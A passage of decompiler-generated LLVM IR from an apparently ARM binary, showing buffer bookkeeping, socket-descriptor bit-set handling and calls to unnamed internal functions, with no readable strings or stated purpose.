  %v2_8b30 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v3_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v4_8b40 = call i32 @function_f964(i8* %v3_8b40, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 %v4_8b40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b44

dec_label_pc_8b44:                                ; preds = %dec_label_pc_887c, %dec_label_pc_8a74
  %v0_8b44 = load i32, i32* @r6, align 4
  %v1_8b44 = add i32 %v0_8b44, 16
  %v2_8b44 = inttoptr i32 %v1_8b44 to i32*
  %v3_8b44 = load i32, i32* %v2_8b44, align 4
  store i32 %v3_8b44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b48 = icmp eq i32 %v3_8b44, 0
  store i1 %v2_8b48, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_8b44, 1
  br i1 %tmp177, label %dec_label_pc_8bf0, label %dec_label_pc_8b50

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8b44
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @function_f93c(i8* %v1_88b0)
  %v2_8b5c = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b5c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_159c4.32 to i32), i32* %r1.global-to-local, align 4
  %v3_8b64 = inttoptr i32 %v2_8b5c to i8*
  %v4_8b64 = call i32 @function_f964(i8* %v3_8b64, i32 ptrtoint ([9 x i8]* @global_var_159c4.32 to i32))
  store i32 %v4_8b64, i32* %r0.global-to-local, align 4
  %v0_8b68 = load i32, i32* @r6, align 4
  %v1_8b68 = add i32 %v0_8b68, 16
  %v2_8b68 = inttoptr i32 %v1_8b68 to i32*
  %v3_8b68 = load i32, i32* %v2_8b68, align 4
  store i32 %v3_8b68, i32* %r3.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b70 = icmp eq i32 %v3_8b68, 0
  store i1 %v2_8b70, i1* %cpsr_z.global-to-local, align 1
  %v0_8b74 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b74, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_8b68, 1
  br i1 %tmp178, label %dec_label_pc_8bd8, label %dec_label_pc_8b7c

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b50, %dec_label_pc_8b7c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b80 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_8b88 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8b90 = and i32 %v3_8b88, 33554432
  %v2_8b90 = icmp ne i32 %v1_8b90, 0
  store i1 %v2_8b90, i1* %cpsr_c.global-to-local, align 1
  %v3_8b90 = mul i32 %v3_8b88, 128
  %v1_8b94 = add i32 %v3_8b90, 1472
  %v2_8b98 = add i32 %v2_8b80, %stack_var_-20860.0.ph
  store i32 %v2_8b98, i32* @r0, align 4
  %v0_8b9c = load i32, i32* @r5, align 4
  %v2_8b9c = add i32 %v1_8b94, %v0_8b9c
  store i32 %v2_8b9c, i32* %r1.global-to-local, align 4
  %v2_8ba0 = inttoptr i32 %v2_8b98 to i8*
  %v3_8ba0 = call i32 @function_f964(i8* %v2_8ba0, i32 %v2_8b9c)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ba8 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159d0.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8bb4 = add i32 %v2_8ba8, %stack_var_-20860.0.ph
  store i32 %v2_8bb4, i32* @r0, align 4
  %v3_8bb8 = inttoptr i32 %v2_8bb4 to i8*
  %v4_8bb8 = call i32 @function_f964(i8* %v3_8bb8, i32 ptrtoint ([3 x i8]* @global_var_159d0.34 to i32))
  store i32 %v4_8bb8, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_8bc0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bc0, i32* %r3.global-to-local, align 4
  %v0_8bc4 = load i32, i32* @r6, align 4
  %v1_8bc4 = add i32 %v0_8bc4, 16
  %v2_8bc4 = inttoptr i32 %v1_8bc4 to i32*
  %v3_8bc4 = load i32, i32* %v2_8bc4, align 4
  store i32 %v3_8bc4, i32* %r2.global-to-local, align 4
  %v1_8bc8 = add i32 %v3_8bc0, 1
  store i32 %v1_8bc8, i32* %ip.global-to-local, align 4
  %v3_8bcc = icmp uge i32 %v3_8bc4, %v1_8bc8
  store i1 %v3_8bcc, i1* %cpsr_c.global-to-local, align 1
  %v9_8bcc = icmp eq i32 %v3_8bc4, %v1_8bc8
  store i1 %v9_8bcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8bc8, i32* %stack_var_-44, align 4
  %v8_8bd4 = icmp sgt i32 %v3_8bc4, %v1_8bc8
  br i1 %v8_8bd4, label %dec_label_pc_8b7c, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b7c, %dec_label_pc_8b50
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bdc = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8be8 = add i32 %v2_8bdc, %stack_var_-20860.0.ph
  store i32 %v2_8be8, i32* @r0, align 4
  %v3_8bec = inttoptr i32 %v2_8be8 to i8*
  %v4_8bec = call i32 @function_f964(i8* %v3_8bec, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 %v4_8bec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8b44, %dec_label_pc_8bd8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bf4 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8c00 = add i32 %v2_8bf4, %stack_var_-20860.0.ph
  store i32 %v2_8c00, i32* @r0, align 4
  %v3_8c04 = inttoptr i32 %v2_8c00 to i8*
  %v4_8c04 = call i32 @function_f964(i8* %v3_8c04, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 %v4_8c04, i32* %r0.global-to-local, align 4
  store i32 %v6_81bc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c0c, label %dec_label_pc_8c2c, label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8bf0
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c18 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81bc, i32* %r1.global-to-local, align 4
  %v2_8c24 = add i32 %v2_8c18, %stack_var_-20860.0.ph
  store i32 %v2_8c24, i32* @r0, align 4
  %v2_8c28 = inttoptr i32 %v2_8c24 to i8*
  %v3_8c28 = call i32 @function_f964(i8* %v2_8c28, i32 %v6_81bc)
  store i32 %v3_8c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c2c

dec_label_pc_8c2c:                                ; preds = %dec_label_pc_8bf0, %dec_label_pc_8c14
  %v0_8c2c = load i32, i32* @r5, align 4
  %v1_8c2c = add i32 %v0_8c2c, 1440
  store i32 %v1_8c2c, i32* %r4.global-to-local, align 4
  %v0_8c30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c30, i32* %r0.global-to-local, align 4
  store i32 %v1_8c2c, i32* %r1.global-to-local, align 4
  %v2_8c38 = inttoptr i32 %v0_8c30 to i8*
  %v3_8c38 = call i32 @function_fd1c(i8* %v2_8c38, i32 %v1_8c2c)
  store i32 %v3_8c38, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c3c = icmp eq i32 %v3_8c38, 0
  store i1 %v2_8c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c3c, label %dec_label_pc_967c, label %dec_label_pc_8c44

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8c2c, %dec_label_pc_967c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c48 = load i32, i32* @r6, align 4
  %v1_8c48 = add i32 %v0_8c48, -1452
  %v2_8c48 = inttoptr i32 %v1_8c48 to i32*
  %v3_8c48 = load i32, i32* %v2_8c48, align 4
  store i32 %v3_8c48, i32* @r4, align 4
  %v2_8c4c = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c4c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c5c = load i32, i32* @r4, align 4
  store i32 %v0_8c5c, i32* %r0.global-to-local, align 4
  %v4_8c60 = call i32 @function_10d34(i32 %v0_8c5c, i32 %stack_var_-20860.0.ph, i32 %v2_8c4c, i32 16384)
  store i32 %v4_8c60, i32* %r0.global-to-local, align 4
  %v0_8c64 = load i32, i32* @r6, align 4
  %v1_8c64 = add i32 %v0_8c64, -1452
  %v2_8c64 = inttoptr i32 %v1_8c64 to i32*
  %v3_8c64 = load i32, i32* %v2_8c64, align 4
  store i32 %v3_8c64, i32* %ip.global-to-local, align 4
  %v3_8c6c = udiv i32 %v3_8c64, 32
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v3_8c74 = mul nuw nsw i32 %v3_8c6c, 4
  %v2_8c78 = add i32 %v3_8c74, %v2_86d0
  store i32 %v2_8c78, i32* %r2.global-to-local, align 4
  %v1_8c7c = add i32 %v2_8c78, -164
  %v2_8c7c = inttoptr i32 %v1_8c7c to i32*
  %v3_8c7c = load i32, i32* %v2_8c7c, align 4
  %v1_8c84 = urem i32 %v3_8c64, 32
  store i32 %v1_8c84, i32* %r0.global-to-local, align 4
  %v7_8c88 = shl i32 1, %v1_8c84
  %v8_8c88 = or i32 %v3_8c7c, %v7_8c88
  store i32 %v8_8c88, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8c88, i32* %v2_8c7c, align 4
  %v0_8c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c94 = trunc i32 %v0_8c94 to i8
  %v2_8c94 = load i32, i32* @r6, align 4
  %v3_8c94 = add i32 %v2_8c94, -1448
  %v4_8c94 = inttoptr i32 %v3_8c94 to i8*
  store i8 %v1_8c94, i8* %v4_8c94, align 1
  %v0_8c98 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c98 = load i32, i32* @r8, align 4
  %v2_8c98 = sub i32 %v0_8c98, %v1_8c98
  %v3_8c98 = icmp uge i32 %v0_8c98, %v1_8c98
  store i1 %v3_8c98, i1* %cpsr_c.global-to-local, align 1
  %v4_8c98 = xor i32 %v1_8c98, %v0_8c98
  %v5_8c98 = xor i32 %v2_8c98, %v0_8c98
  %v6_8c98 = and i32 %v5_8c98, %v4_8c98
  %v7_8c98 = icmp slt i32 %v6_8c98, 0
  %v8_8c98 = icmp slt i32 %v2_8c98, 0
  %v9_8c98 = icmp eq i32 %v0_8c98, %v1_8c98
  store i1 %v9_8c98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_84f0, i32* %r2.global-to-local, align 4
  %v3_8ca0 = xor i1 %v8_8c98, %v7_8c98
  %v4_8ca0 = or i1 %v9_8c98, %v3_8ca0
  br i1 %v4_8ca0, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_8c44
  %v6_8ca0 = add i32 %v0_8c98, 1
  store i32 %v6_8ca0, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_8c44, %bb179
  %v1_8ca4 = load i32, i32* @r6, align 4
  %v2_8ca4 = add i32 %v1_8ca4, -1440
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v2_84f0, i32* %v3_8ca4, align 4
  br label %dec_label_pc_85b4

dec_label_pc_8cac:                                ; preds = %dec_label_pc_856c
  %v1_8cac = add i32 %v3_8870, -1444
  %v2_8cac = inttoptr i32 %v1_8cac to i32*
  %v3_8cac = load i32, i32* %v2_8cac, align 4
  store i32 %v2_84f0, i32* %r1.global-to-local, align 4
  %v2_8cb4 = sub i32 %v2_84f0, %v3_8cac
  store i32 %v2_8cb4, i32* %r3.global-to-local, align 4
  %v2_8cb8 = icmp ugt i32 %v2_8cb4, 29
  store i1 %v2_8cb8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cb8 = icmp eq i32 %v2_8cb4, 30
  store i1 %v7_8cb8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cbc = xor i1 %v7_8cb8, true
  %v3_8cbc = and i1 %v2_8cb8, %v2_8cbc
  br i1 %v3_8cbc, label %dec_label_pc_859c, label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8cac
  %v2_8cc0 = inttoptr i32 %v1_85d8 to i32*
  %v3_8cc0 = load i32, i32* %v2_8cc0, align 4
  store i32 %v3_8cc0, i32* %ip.global-to-local, align 4
  %v3_8cc8 = udiv i32 %v3_8cc0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ccc = mul nuw nsw i32 %v3_8cc8, 4
  store i32 %v3_8ccc, i32* %r2.global-to-local, align 4
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_86d8

dec_label_pc_8cdc:                                ; preds = %dec_label_pc_857c
  %v2_8cdc = inttoptr i32 %v1_85d8 to i32*
  %v3_8cdc = load i32, i32* %v2_8cdc, align 4
  store i32 %v3_8cdc, i32* %ip.global-to-local, align 4
  %v3_8ce4 = udiv i32 %v3_8cdc, 32
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v3_8cec = mul nuw nsw i32 %v3_8ce4, 4
  %v2_8cf0 = add i32 %v3_8cec, %v2_86d0
  store i32 %v2_8cf0, i32* %r2.global-to-local, align 4
  %v1_8cf4 = add i32 %v2_8cf0, -164
  %v2_8cf4 = inttoptr i32 %v1_8cf4 to i32*
  %v3_8cf4 = load i32, i32* %v2_8cf4, align 4
  %v1_8cf8 = urem i32 %v3_8cdc, 32
  store i32 %v1_8cf8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d00 = shl i32 1, %v1_8cf8
  %v8_8d00 = or i32 %v3_8cf4, %v7_8d00
  store i32 %v8_8d00, i32* %r1.global-to-local, align 4
  %v1_8d04 = load i32, i32* @r8, align 4
  %v2_8d04 = sub i32 %v3_8cdc, %v1_8d04
  %v3_8d04 = icmp uge i32 %v3_8cdc, %v1_8d04
  store i1 %v3_8d04, i1* %cpsr_c.global-to-local, align 1
  %v4_8d04 = xor i32 %v1_8d04, %v3_8cdc
  %v5_8d04 = xor i32 %v2_8d04, %v3_8cdc
  %v6_8d04 = and i32 %v5_8d04, %v4_8d04
  %v7_8d04 = icmp slt i32 %v6_8d04, 0
  %v8_8d04 = icmp slt i32 %v2_8d04, 0
  %v9_8d04 = icmp eq i32 %v3_8cdc, %v1_8d04
  store i1 %v9_8d04, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d00, i32* %v2_8cf4, align 4
  %v3_8d0c = xor i1 %v8_8d04, %v7_8d04
  %v4_8d0c = or i1 %v9_8d04, %v3_8d0c
  br i1 %v4_8d0c, label %dec_label_pc_85b4, label %dec_label_pc_8d10

dec_label_pc_8d10:                                ; preds = %dec_label_pc_8cdc
  %v0_8d10 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d10 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d10 = add i32 %v1_8d10, %v0_8d10
  store i32 %v2_8d10, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8d18:                                ; preds = %dec_label_pc_879c
  %v0_8d18 = call i32 @function_10a30()
  store i32 %v0_8d18, i32* %r0.global-to-local, align 4
  %v0_8d1c = load i32, i32* @sl, align 4
  %v1_8d1c = add i32 %v0_8d1c, 660
  %v2_8d1c = inttoptr i32 %v1_8d1c to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* @r3, align 4
  %v0_8d20 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d24 = icmp ugt i32 %v3_8d1c, 1023
  store i1 %v2_8d24, i1* %cpsr_c.global-to-local, align 1
  %v7_8d24 = icmp eq i32 %v3_8d1c, 1024
  store i1 %v7_8d24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d18, i32* %fp.global-to-local, align 4
  %v1_8d2c = add i32 %v0_8d20, 2116
  store i32 %v1_8d2c, i32* @r7, align 4
  br i1 %v7_8d24, label %dec_label_pc_8e30, label %dec_label_pc_8d34

dec_label_pc_8d34:                                ; preds = %dec_label_pc_8d18, %dec_label_pc_8e30, %dec_label_pc_8e24
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d38 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d38 = inttoptr i32 %v1_8d38 to i32*
  store i32 0, i32* %v2_8d38, align 4
  %v0_8d3c = load i32, i32* @sl, align 4
  %v1_8d3c = add i32 %v0_8d3c, 660
  %v2_8d3c = inttoptr i32 %v1_8d3c to i32*
  %v3_8d3c = load i32, i32* %v2_8d3c, align 4
  store i32 %v3_8d3c, i32* %r1.global-to-local, align 4
  %v1_8d40 = add i32 %v0_8d3c, -1452
  %v2_8d40 = inttoptr i32 %v1_8d40 to i32*
  %v3_8d40 = load i32, i32* %v2_8d40, align 4
  store i32 %v3_8d40, i32* %r0.global-to-local, align 4
  %v1_8d44 = sub i32 1024, %v3_8d3c
  store i32 %v1_8d44, i32* %r2.global-to-local, align 4
  %v0_8d48 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 16384
  store i32 %v1_8d48, i32* %r3.global-to-local, align 4
  %v0_8d4c = load i32, i32* @r7, align 4
  %v2_8d4c = add i32 %v0_8d4c, %v3_8d3c
  store i32 %v2_8d4c, i32* %r1.global-to-local, align 4
  %v4_8d50 = call i32 @function_10cc0(i32 %v3_8d40, i32 %v2_8d4c, i32 %v1_8d44, i32 %v1_8d48)
  store i32 %v4_8d50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d54 = icmp eq i32 %v4_8d50, 0
  store i1 %v2_8d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d54, label %dec_label_pc_968c, label %dec_label_pc_8d5c

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8d34
  %v2_8d5c = icmp eq i32 %v4_8d50, -1
  store i1 %v2_8d5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d5c = icmp eq i32 %v4_8d50, -1
  store i1 %v7_8d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d5c, label %dec_label_pc_96b0, label %dec_label_pc_8d64

dec_label_pc_8d64:                                ; preds = %dec_label_pc_8d5c
  %v0_8d64 = load i32, i32* @sl, align 4
  %v1_8d64 = add i32 %v0_8d64, 660
  %v2_8d64 = inttoptr i32 %v1_8d64 to i32*
  %v3_8d64 = load i32, i32* %v2_8d64, align 4
  store i32 %v2_875c, i32* %r1.global-to-local, align 4
  %v2_8d6c = add i32 %v3_8d64, %v4_8d50
  store i32 %v2_8d6c, i32* @r4, align 4
  store i32 %v2_8d6c, i32* %v2_8d64, align 4
  %v0_8d74 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d74 = load i32, i32* @sl, align 4
  %v2_8d74 = add i32 %v1_8d74, -1444
  %v3_8d74 = inttoptr i32 %v2_8d74 to i32*
  store i32 %v0_8d74, i32* %v3_8d74, align 4
  br label %dec_label_pc_8e04

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8e04
  %v1_8d7c = inttoptr i32 %v0_8e04 to i32*
  %v2_8d7c = load i32, i32* %v1_8d7c, align 4
  store i32 %v2_8d7c, i32* @r8, align 4
  %v1_8d80 = load i32, i32* @r4, align 4
  %v5_8d84 = icmp slt i32 %v3_8e04, %v1_8d80
  %storemerge49 = select i1 %v5_8d84, i32 %v3_8e04, i32 %v1_8d80
  store i32 %storemerge49, i32* @r6, align 4
  %v2_8d8c = sub i32 %v3_8e04, %storemerge49
  store i32 %v2_8d8c, i32* %r3.global-to-local, align 4
  %v2_8d90 = icmp ne i32 %v2_8d7c, 0
  store i1 %v2_8d90, i1* %cpsr_c.global-to-local, align 1
  %v7_8d90 = icmp eq i32 %v2_8d7c, 1
  store i1 %v7_8d90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8d8c, i32* %v2_8e04, align 4
  br i1 %v7_8d90, label %dec_label_pc_8e54, label %.dec_label_pc_8da0thread-pre-split_crit_edge

.dec_label_pc_8da0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8d7c
  %v1_8d98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8d98, i32* @r5, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8da0:                                ; preds = %dec_label_pc_8e10, %.dec_label_pc_8da0thread-pre-split_crit_edge, %dec_label_pc_8e7c
  %v0_8da0 = phi i32 [ %v3_8e7c, %dec_label_pc_8e7c ], [ %v1_8d98, %.dec_label_pc_8da0thread-pre-split_crit_edge ], [ %v3_8e04, %dec_label_pc_8e10 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8da0 = icmp eq i32 %v0_8da0, 0
  store i1 %v2_8da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8da0, label %dec_label_pc_8da8, label %dec_label_pc_8dc8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8da0
  %v0_8da8 = load i32, i32* @sl, align 4
  %v1_8da8 = add i32 %v0_8da8, 8
  %v2_8da8 = inttoptr i32 %v1_8da8 to i32*
  %v3_8da8 = load i32, i32* %v2_8da8, align 4
  store i32 %v3_8da8, i32* @r4, align 4
  %v2_8dac = icmp ne i32 %v3_8da8, 0
  store i1 %v2_8dac, i1* %cpsr_c.global-to-local, align 1
  %v7_8dac = icmp eq i32 %v3_8da8, 1
  store i1 %v7_8dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dac, label %dec_label_pc_8e84, label %dec_label_pc_8db4

dec_label_pc_8db4:                                ; preds = %dec_label_pc_8da8
  %v1_8db4 = add i32 %v0_8da8, 660
  %v2_8db4 = inttoptr i32 %v1_8db4 to i32*
  %v3_8db4 = load i32, i32* %v2_8db4, align 4
  %v0_8db8 = load i32, i32* @r6, align 4
  %v2_8db8 = sub i32 %v3_8db4, %v0_8db8
  store i32 %v2_8db8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dbc = icmp eq i32 %v2_8db8, 0
  store i1 %v2_8dbc, i1* %cpsr_z.global-to-local, align 1
  %v2_8dc0 = add i32 %v0_8da8, 12
  %v3_8dc0 = inttoptr i32 %v2_8dc0 to i32*
  store i32 %v2_8db8, i32* %v3_8dc0, align 4
  br i1 %v2_8dbc, label %dec_label_pc_9670, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8da0, %dec_label_pc_8e84, %dec_label_pc_8db4, %dec_label_pc_8f0c
  %v0_8dc8 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dc8 = icmp eq i32 %v0_8dc8, 0
  store i1 %v2_8dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8dc8, label %dec_label_pc_8e18, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8dc8
  %v0_8dd0 = load i32, i32* @sl, align 4
  %v1_8dd0 = add i32 %v0_8dd0, 660
  %v2_8dd0 = inttoptr i32 %v1_8dd0 to i32*
  %v3_8dd0 = load i32, i32* %v2_8dd0, align 4
  store i32 %v3_8dd0, i32* @r3, align 4
  %v2_8dd4 = sub i32 %v3_8dd0, %v0_8dc8
  store i32 %v2_8dd4, i32* @r4, align 4
  store i32 %v2_8dd4, i32* @r2, align 4
  store i32 %v2_8dd4, i32* %v2_8dd0, align 4
  %v0_8de0 = load i32, i32* @r7, align 4
  %v1_8de0 = load i32, i32* @r6, align 4
  %v2_8de0 = add i32 %v1_8de0, %v0_8de0
  store i32 %v2_8de0, i32* @r1, align 4
  store i32 %v0_8de0, i32* @r0, align 4
  %v3_8de8 = call i32 @function_10b20(i32 %v0_8de0, i32 %v2_8de0, i32 %v2_8dd4)
  store i32 %v3_8de8, i32* %r0.global-to-local, align 4
  %v0_8dec = load i32, i32* @sl, align 4
  %v1_8dec = add i32 %v0_8dec, 660
  %v2_8dec = inttoptr i32 %v1_8dec to i32*
  %v3_8dec = load i32, i32* %v2_8dec, align 4
  store i32 %v3_8dec, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8df4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8df4 = add i32 %v0_8df4, %v3_8dec
  store i32 %v2_8df4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8df8 = icmp eq i32 %v3_8dec, 0
  store i1 %v2_8df8, i1* %cpsr_z.global-to-local, align 1
  %v3_8dfc = add i32 %v2_8df4, 2116
  %v4_8dfc = inttoptr i32 %v3_8dfc to i8*
  store i8 0, i8* %v4_8dfc, align 1
  %v0_8e00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e00, label %dec_label_pc_8e18, label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8dd0, %dec_label_pc_8d64
  %v0_8e04 = load i32, i32* @sl, align 4
  %v1_8e04 = add i32 %v0_8e04, 12
  %v2_8e04 = inttoptr i32 %v1_8e04 to i32*
  %v3_8e04 = load i32, i32* %v2_8e04, align 4
  store i32 %v3_8e04, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v3_8e04, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  %v5_8e0c = icmp sgt i32 %v3_8e04, 0
  br i1 %v5_8e0c, label %dec_label_pc_8d7c, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e04
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8e18:                                ; preds = %dec_label_pc_8dd0, %dec_label_pc_8dc8
  %v0_8e18 = load i32, i32* @sl, align 4
  %v1_8e18 = add i32 %v0_8e18, -1448
  %v2_8e18 = inttoptr i32 %v1_8e18 to i8*
  %v3_8e18 = load i8, i8* %v2_8e18, align 1
  %v4_8e18 = zext i8 %v3_8e18 to i32
  store i32 %v4_8e18, i32* %r3.global-to-local, align 4
  %v2_8e1c = icmp ugt i8 %v3_8e18, 6
  store i1 %v2_8e1c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e1c = icmp eq i8 %v3_8e18, 7
  store i1 %v7_8e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e1c, label %dec_label_pc_8e24, label %dec_label_pc_87ac

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8e18
  %v1_8e24 = add i32 %v0_8e18, 660
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r3, align 4
  %v2_8e28 = icmp ugt i32 %v3_8e24, 1023
  store i1 %v2_8e28, i1* %cpsr_c.global-to-local, align 1
  %v7_8e28 = icmp eq i32 %v3_8e24, 1024
  store i1 %v7_8e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e28, label %dec_label_pc_8e30.loopexit, label %dec_label_pc_8d34

dec_label_pc_8e30.loopexit:                       ; preds = %dec_label_pc_8e24
  %v0_8e30.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e38.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %dec_label_pc_8e30.loopexit, %dec_label_pc_8d18
  %v0_8e38 = phi i32 [ %v0_8e38.pre, %dec_label_pc_8e30.loopexit ], [ %v1_8d2c, %dec_label_pc_8d18 ]
  %v0_8e30 = phi i32 [ %v0_8e30.pre, %dec_label_pc_8e30.loopexit ], [ %v0_8d20, %dec_label_pc_8d18 ]
  %v1_8e34 = add i32 %v0_8e30, 2180
  store i32 %v1_8e34, i32* @r1, align 4
  store i32 %v0_8e38, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
